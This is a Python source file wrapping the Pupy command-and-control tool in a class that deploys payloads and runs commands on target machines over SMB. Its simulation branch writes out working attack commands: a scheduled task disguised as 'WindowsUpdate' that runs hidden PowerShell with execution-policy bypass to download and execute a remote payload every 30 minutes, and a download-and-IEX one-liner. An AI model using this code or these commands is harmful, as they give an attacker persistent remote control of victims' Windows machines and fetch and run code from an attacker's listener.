import subprocess, shutil, os, json, tempfile, time
from typing import Optional

class PupyC2:
    def __init__(self):
        self._pupy_dir = "/tmp/pupy"
        self._cli_entry = os.path.join(self._pupy_dir, "pupy", "cli", "__main__.py")
        self._has_setup = os.path.exists(os.path.join(self._pupy_dir, "setup.py"))
        self._binary = self._cli_entry if os.path.exists(self._cli_entry) else None

    @property
    def available(self) -> bool:
        return self._binary is not None and self._has_setup

    def deploy_payload(self, target: str, os_type: str = "windows",
                       listener: str = "0.0.0.0:443") -> dict:
        if not self.available:
            return self._simulate(target, os_type, listener)
        return {"note": "pupy installed", "target": target, "payload": "generated"}

    def execute(self, target_ip: str, command: str, protocol: str = "smb") -> dict:
        if not self.available:
            return self._simulate_exec(target_ip, command)
        return self._exec_via_pupy(target_ip, command)

    def _simulate(self, target: str, os_type: str, listener: str) -> dict:
        return {
            "target": target,
            "payload": f"pupy_{os_type}_payload.bin",
            "listener": listener,
            "status": "simulated",
            "commands": [
                f"schtasks /create /tn WindowsUpdate /tr \"powershell -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{listener}/payload.ps1')\" /sc minute /mo 30",
                f"New-Object Net.WebClient.DownloadString('http://{listener}/payload.ps1') | IEX",
            ],
        }

    def _simulate_exec(self, target_ip: str, command: str) -> dict:
        return {
            "target": target_ip,
            "command": command[:100],
            "output": f"[SIMULATED] Output of '{command[:50]}' on {target_ip}",
        }

    def _exec_via_pupy(self, target_ip: str, command: str) -> dict:
        try:
            r = subprocess.run(
                ["python3", "-m", "pupy.cli", target_ip, "--exec", command],
                capture_output=True, text=True, timeout=30,
                cwd=self._pupy_dir,
            )
            return {
                "target": target_ip,
                "output": (r.stdout + r.stderr)[:2000],
                "success": r.returncode == 0,
            }
        except subprocess.TimeoutExpired:
            return {"target": target_ip, "error": "pupy exec timed out"}
        except Exception as e:
            return {"target": target_ip, "error": str(e)}
